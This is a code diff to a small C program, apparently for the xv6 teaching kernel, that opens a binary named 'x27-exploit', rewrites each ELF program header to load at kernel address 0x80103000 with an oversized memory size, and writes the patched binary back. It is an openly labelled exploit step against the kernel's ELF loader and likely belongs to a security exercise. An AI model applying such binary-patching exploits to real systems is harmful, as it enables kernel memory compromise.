@@ -17,9 +17,10 @@
 int
 main(int argc, char** argv)
 {
-  // Open our malicious program first
   int fd;
-  if ((fd = open("x27-exploit", O_RDWR)) < 0) {
+
+  // Open our malicious program first
+  if ((fd = open("x27-exploit", O_RDONLY)) < 0) {
     printf(2, "x27-modify: cannot open x27-exploit\n");
     exit();
   }
@@ -37,20 +38,34 @@ main(int argc, char** argv)
     exit();
   }
 
+  close(fd);
+
   // Write to ph.vaddr
   // TODO: Read all
   struct elfhdr* elf = (struct elfhdr*)raw;
 
   struct proghdr* ph;
-  printf(1, "%x\n", elf->magic);
-  printf(1, "%d\n", (int)elf->phnum);
   for(int i=0, off=elf->phoff; i<elf->phnum; i++, off+=sizeof(ph)){
     ph = raw + off;
-    printf(1, "Section: %s\n", raw + ph->off);
+    ph->vaddr = 0x80103000;
+    ph->memsz = 0x7fefe000;
   }
 
-  // __asm__ volatile(
-  //   "movb $1, 0x0;"
-  // );
+  // Remove x27-exploit
+  if (unlink("x27-exploit") < 0) {
+    printf(2, "Failed to unlink x27-exploit\n");
+    exit();
+  }
+
+  if ((fd = open("x27-exploit", O_CREATE | O_WRONLY)) < 0) {
+    printf(2, "x27-modify: cannot open x27-exploit\n");
+    exit();
+  }
+
+  if (write(fd, raw, st.size) != st.size) {
+    printf(2, "Failed to write to x27-exploit\n");
+    exit();
+  }
+
   exit();
 }
